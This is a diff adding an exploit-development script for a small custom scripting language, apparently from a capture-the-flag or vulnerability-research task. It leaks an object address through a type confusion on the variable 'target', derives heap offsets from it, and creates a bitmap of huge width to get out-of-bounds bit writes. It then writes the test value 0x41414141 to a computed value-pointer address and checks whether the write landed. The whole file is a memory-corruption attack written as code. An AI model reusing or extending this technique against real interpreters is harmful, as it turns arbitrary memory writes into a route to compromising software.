@@ -1,0 +1,93 @@
+print("=== Test Write with Corrected Addresses ===");
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+int entryaddr = targetaddr - 768;
+int valueptraddr = entryaddr + 40;
+int bitmapdataptr = targetaddr - 8192;
+print("Calculated addresses:");
+print("entry_addr:");
+print(entryaddr);
+print("value_ptr_addr:");
+print(valueptraddr);
+print("bitmap_data_ptr:");
+print(bitmapdataptr);
+
+print("Creating bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Calculating coordinates:");
+print("offset = valueptraddr - bitmapdataptr");
+int offset = valueptraddr - bitmapdataptr;
+print("offset:");
+print(offset);
+print("bit_offset = offset * 8");
+int bitoffset = offset * 8;
+print("bit_offset:");
+print(bitoffset);
+print("y = bit_offset / 9223372036854775807");
+int y = bitoffset / 9223372036854775807;
+print("y:");
+print(y);
+print("x = bit_offset % 8");
+int x = bitoffset % 8;
+print("x:");
+print(x);
+
+print("Writing test value 0x41414141 to value_ptr_addr");
+print("This is 32 bits, writing as 64-bit: 0x0000000041414141");
+print("Binary: 01000001 01000001 01000001 01000001 (repeated 4 times)");
+
+print("Writing bits starting at y=0, x=0");
+print("Each byte is 01000001 (0x41)");
+print("Bit pattern: 0,1,0,0,0,0,0,1 per byte");
+
+print("Note: Need to write 64 bits total");
+print("For now, writing first 32 bits as test:");
+
+set(b1, 0, 0, 0);
+set(b1, 1, 0, 1);
+set(b1, 2, 0, 0);
+set(b1, 3, 0, 0);
+set(b1, 4, 0, 0);
+set(b1, 5, 0, 0);
+set(b1, 6, 0, 0);
+set(b1, 7, 0, 1);
+
+set(b1, 0, 1, 0);
+set(b1, 1, 1, 1);
+set(b1, 2, 1, 0);
+set(b1, 3, 1, 0);
+set(b1, 4, 1, 0);
+set(b1, 5, 1, 0);
+set(b1, 6, 1, 0);
+set(b1, 7, 1, 1);
+
+set(b1, 0, 2, 0);
+set(b1, 1, 2, 1);
+set(b1, 2, 2, 0);
+set(b1, 3, 2, 0);
+set(b1, 4, 2, 0);
+set(b1, 5, 2, 0);
+set(b1, 6, 2, 0);
+set(b1, 7, 2, 1);
+
+set(b1, 0, 3, 0);
+set(b1, 1, 3, 1);
+set(b1, 2, 3, 0);
+set(b1, 3, 3, 0);
+set(b1, 4, 3, 0);
+set(b1, 5, 3, 0);
+set(b1, 6, 3, 0);
+set(b1, 7, 3, 1);
+
+print("Wrote first 32 bits (0x41414141)");
+print("Now verify:");
+print("int test = target;");
+print("print(test);");
+print("If test == 1094795585 (0x41414141), addresses are correct!");
+
